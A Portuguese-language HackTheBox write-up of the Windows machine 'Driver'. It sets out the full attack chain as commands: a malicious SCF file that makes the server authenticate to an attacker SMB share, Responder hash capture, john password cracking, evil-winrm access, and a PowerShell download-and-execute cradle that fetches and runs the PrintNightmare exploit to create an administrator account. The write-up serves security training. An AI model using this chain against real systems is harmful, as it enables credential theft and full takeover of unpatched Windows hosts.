# Driver

## Informações da Máquina

| Atributo | Valor |
|----------|-------|
| **Plataforma** | HackTheBox |
| **Dificuldade** | Easy |
| **OS** | Windows |
| **Técnicas** | SCF File Attack, Hash Capture, PrintNightmare CVE-2021-1675 |
| **Link HTB** | [https://app.hackthebox.com/machines/Driver](https://app.hackthebox.com/machines/Driver) |

## Resumo

Máquina Windows com servidor web que aceita upload de arquivos. SCF file attack captura hash NTLM via SMB. Após crack da hash, acesso via evil-winrm. Escalação de privilégios através de exploit PrintNightmare (CVE-2021-1675).

## Enumeration/Scanning

### Port Scanning

```bash
nmap -sVC -oN nmap.out [IP]
```

**Portas abertas:**
- 80/tcp - HTTP (Microsoft IIS httpd 10.0)
- 135/tcp - MSRPC
- 445/tcp - SMB (Windows)
- 5985/tcp - WinRM

**OS:** Windows Server

### Web Discovery

Site possui autenticação HTTP Basic. Credenciais padrão `admin:admin` funcionam.

Funcionalidade encontrada: Upload de drivers (arquivos).

## Exploitation

### SCF File Attack

Criando arquivo SCF malicioso (`@teste.scf`):

```ini
[Shell]
Command=2
IconFile=\\10.10.16.47\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Nome começa com `@` para aparecer no topo do diretório.

### Hash Capture with Responder

```bash
python responder -wrf --lm -v -I tun0
```

Após upload do arquivo SCF, servidor Windows tenta acessar nosso SMB share.

**Hash NTLM capturada** para usuário `tony`.

### Hash Cracking

```bash
john --wordlist=~/wordlists/rockyou.txt --format=netntlmv2 hash.txt
```

**Senha crackeada:** `liltony`

### DNS Configuration

```bash
echo "10.10.11.106 driver.htb" >> /etc/hosts
```

### User Enumeration

```bash
rpcclient -U "tony%liltony" driver.htb
rpcclient $> enumdomusers
# user:[Administrator] rid:[0x1f4]
# user:[tony] rid:[0x3eb]
# user:[user] rid:[0x3ec]
```

### WinRM Access

```bash
evil-winrm -i 10.10.11.106 -u tony -p liltony
```

**User Flag:** ✓

## Privilege Escalation

### Service Enumeration

Usando WinPEAS ou verificação manual de serviços:

**Serviço vulnerável encontrado:** `spoolsv` (Print Spooler) - desatualizado

### CVE-2021-1675 (PrintNightmare)

Exploit PowerShell disponível no GitHub.

Download do script via servidor HTTP:

```powershell
IEX(New-Object Net.Webclient).downloadstring('http://10.10.15.84/CVE-2021-1675.ps1')
```

Executando o exploit:

```powershell
Invoke-Nightmare -NewUser "kp" -NewPassword "l337"
```

**Novo usuário administrador criado.**

### Administrator Access

```bash
evil-winrm -i 10.10.11.106 -u kp -p l337
```

**Root Flag:** ✓

## Lições Aprendidas

- **SCF files** podem forçar Windows a autenticar em SMB shares remotos, vazando hash NTLM
- Prefixar filename com `@` garante que arquivo apareça primeiro em listagens
- **Responder** é ferramenta essencial para capturar hashes NTLM em ataques SMB
- **PrintNightmare (CVE-2021-1675)** permite criação de usuários administradores em sistemas não patcheados
- Windows Print Spooler é vetor de ataque comum - sempre verificar versão e patches

---

*Writeup by kp*
